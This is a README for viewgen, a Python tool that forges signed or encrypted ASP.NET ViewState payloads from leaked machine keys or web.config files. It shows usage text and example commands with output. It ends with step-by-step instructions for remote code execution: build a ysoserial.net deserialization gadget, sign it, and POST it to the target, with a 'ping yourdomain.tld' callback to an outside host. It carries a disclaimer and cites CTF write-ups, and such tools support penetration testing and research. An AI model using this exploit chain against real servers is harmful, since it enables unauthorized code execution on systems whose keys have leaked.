# viewgen

### ASP.NET ViewState Generator

**viewgen** is a ViewState tool capable of generating both signed and encrypted payloads with leaked validation keys or `web.config` files

---------------

**Requirements**: Python 3

### Installation

`pip3 install --upgrade -r requirements.txt` or `./install.sh`


---------------

### Usage
```bash
$ viewgen -h
usage: viewgen [-h] [--webconfig WEBCONFIG] [-m MODIFIER] [-c COMMAND]
               [--decode] [--guess] [--check] [--vkey VKEY] [--valg VALG]
               [--dkey DKEY] [--dalg DALG] [-e]
               [payload]

viewgen is a ViewState tool capable of generating both signed and encrypted
payloads with leaked validation keys or web.config files

positional arguments:
  payload               ViewState payload (base 64 encoded)

optional arguments:
  -h, --help            show this help message and exit
  --webconfig WEBCONFIG
                        automatically load keys and algorithms from a
                        web.config file
  -m MODIFIER, --modifier MODIFIER
                        VIEWSTATEGENERATOR value
  -c COMMAND, --command COMMAND
                        Command to execute
  --decode              decode a ViewState payload
  --guess               guess signature and encryption mode for a given
                        payload
  --check               check if modifier and keys are correct for a given
                        payload
  --vkey VKEY           validation key
  --valg VALG           validation algorithm
  --dkey DKEY           decryption key
  --dalg DALG           decryption algorithm
  -e, --encrypted       ViewState is encrypted
```

---------------

### Examples

```bash
$ viewgen --decode --check --webconfig web.config --modifier CA0B0334 "zUylqfbpWnWHwPqet3cH5Prypl94LtUPcoC7ujm9JJdLm8V7Ng4tlnGPEWUXly+CDxBWmtOit2HY314LI8ypNOJuaLdRfxUK7mGsgLDvZsMg/MXN31lcDsiAnPTYUYYcdEH27rT6taXzDWupmQjAjraDueY="
[+] ViewState
(('1628925133', (None, [3, (['enctype', 'multipart/form-data'], None)])), None)
[+] Signature
7441f6eeb4fab5a5f30d6ba99908c08eb683b9e6
[+] Signature match

$ viewgen --webconfig web.config --modifier CA0B0334 "/wEPDwUKMTYyODkyNTEzMw9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRk"
r4zCP5CdSo5R9XmiEXvp1LHVzX1uICmY7oW2WD/gKS/Mt/s+NKXrMpScr4Gvrji7lFdHPOttFpi2x7YbmQjEjJ2NdBMuzeKFzIuno2DenYF8yVVKx5+LL7LYmI0CVcNQ+jH8VxvzVG58NQIJ/rSr6NqNMBahrVfAyVPgdL4Eke3Bq4XWk6BYW2Bht6ykSHF9szT8tG6KUKwf+T94hFUFNIXXkURptwQJEC/5AMkFXMU0VXDa

$ viewgen --guess "/wEPDwUKMTYyODkyNTEzMw9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkuVmqYhhtcnJl6Nfet5ERqNHMADI="
[+] ViewState is not encrypted
[+] Signature algorithm: SHA1

$ viewgen --guess "zUylqfbpWnWHwPqet3cH5Prypl94LtUPcoC7ujm9JJdLm8V7Ng4tlnGPEWUXly+CDxBWmtOit2HY314LI8ypNOJuaLdRfxUK7mGsgLDvZsMg/MXN31lcDsiAnPTYUYYcdEH27rT6taXzDWupmQjAjraDueY="
[!] ViewState is encrypted
[+] Algorithm candidates:
AES SHA1
DES/3DES SHA1
```

---------------

### Achieving Remote Code Execution

Leaking the `web.config` file or validation keys from ASP.NET apps results in RCE via ObjectStateFormatter deserialization if ViewStates are used.

You can use the built-in `command` option ([ysoserial.net](https://github.com/pwntester/ysoserial.net) based) to generate a payload:

```bash
$ viewgen --webconfig web.config -m CA0B0334 -c "ping yourdomain.tld"
```

However, you can also generate it manually:

**1 -** Generate a payload with [ysoserial.net](https://github.com/pwntester/ysoserial.net):

```bash
> ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "ping yourdomain.tld"
```

**2 -** Grab a modifier (`__VIEWSTATEGENERATOR` value) from a given endpoint of the webapp

**3 -** Generate the signed/encrypted payload:

```bash
$ viewgen --webconfig web.config --modifier MODIFIER PAYLOAD
```

**4 -** Send a POST request with the generated ViewState to the same endpoint

**5 -** Profit 🎉🎉

---------------

**Thanks**

- [@orange_8361](https://twitter.com/orange_8361), the author of *Why so Serials* (HITCON CTF 2018)
- [@infosec_au](https://twitter.com/infosec_au)
- [@smiegles](https://twitter.com/smiegles)
- **BBAC**

---------------

**CTF Writeups**

- https://xz.aliyun.com/t/3019
- https://cyku.tw/ctf-hitcon-2018-why-so-serials/

**Blog Posts**

- https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/

**Talks**

- https://illuminopi.com/assets/files/BSidesIowa_RCEvil.net_20190420.pdf
- https://speakerdeck.com/pwntester/dot-net-serialization-detecting-and-defending-vulnerable-endpoints

---------------

### ⚠ Legal Disclaimer ⚠

This project is made for educational and ethical testing purposes only. Usage of this tool for attacking targets without prior mutual consent is illegal. Developers assume no liability and are not responsible for any misuse or damage caused by this tool.
